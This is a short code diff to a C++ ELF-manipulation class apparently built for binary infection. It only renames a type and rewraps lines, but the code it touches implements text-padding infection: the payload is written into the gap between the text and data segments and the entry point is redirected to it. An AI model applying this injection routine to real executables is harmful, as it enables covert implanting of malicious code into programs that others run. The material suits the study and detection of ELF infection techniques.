@@ -7,7 +7,7 @@ Injections::TextPaddingInfection::TextPaddingInfection(const char *target,
         u8 *magic)
     :Elf(target), tpi_payload(nullptr), tpi_fake_entry(0), tpi_payload_sz(0)
 {
-    tpi_org_entry = (Addr)elf_ehdr->e_entry;
+    tpi_org_entry = (addr_t)elf_ehdr->e_entry;
     for(int i = 0; i < MAGIC_LEN; i++)
         tpi_magic[i] = magic[i];
 }
@@ -49,11 +49,13 @@ off_t Injections::TextPaddingInfection::FindFreeSpace(void)
 
     printf("%d\t%d\n", data_index, text_index);
     assert(text_index + 1 == data_index && "whoaaa!!! exxit exxittt");
-    int available_space = elf_phdr[data_index].p_offset - elf_phdr[text_index]
+    int available_space = elf_phdr[data_index].p_offset - 
+        elf_phdr[text_index]
         .p_offset;
     assert(available_space >= tpi_payload_sz && 
             "available free space is less than size");
-    tpi_fake_entry = elf_phdr[text_index].p_vaddr + elf_phdr[text_index].p_memsz;
+    tpi_fake_entry = elf_phdr[text_index].p_vaddr + elf_phdr[text_index].
+        p_memsz;
     return elf_phdr[text_index].p_offset + elf_phdr[text_index].p_filesz;
 }
 
@@ -61,14 +63,14 @@ void Injections::TextPaddingInfection::InjectPayload(void)
 {
     off_t writeoff = FindFreeSpace();
     try{
-        Binary::PatchAddress((u8 *)tpi_payload, tpi_payload_sz, tpi_org_entry, 
-                (u8 *)tpi_magic);
+        Binary::PatchAddress((u8 *)tpi_payload, tpi_payload_sz, tpi_org_entry
+                , (u8 *)tpi_magic);
     } catch (zkexcept::magic_not_found_error& e){
         std::cerr << e.what();
         std::exit(1);
     }
 
     ElfWrite((void *)tpi_payload, writeoff, tpi_payload_sz);
-    SetEntryPoint((Addr)tpi_fake_entry);
+    SetEntryPoint((addr_t)tpi_fake_entry);
     return;
 }
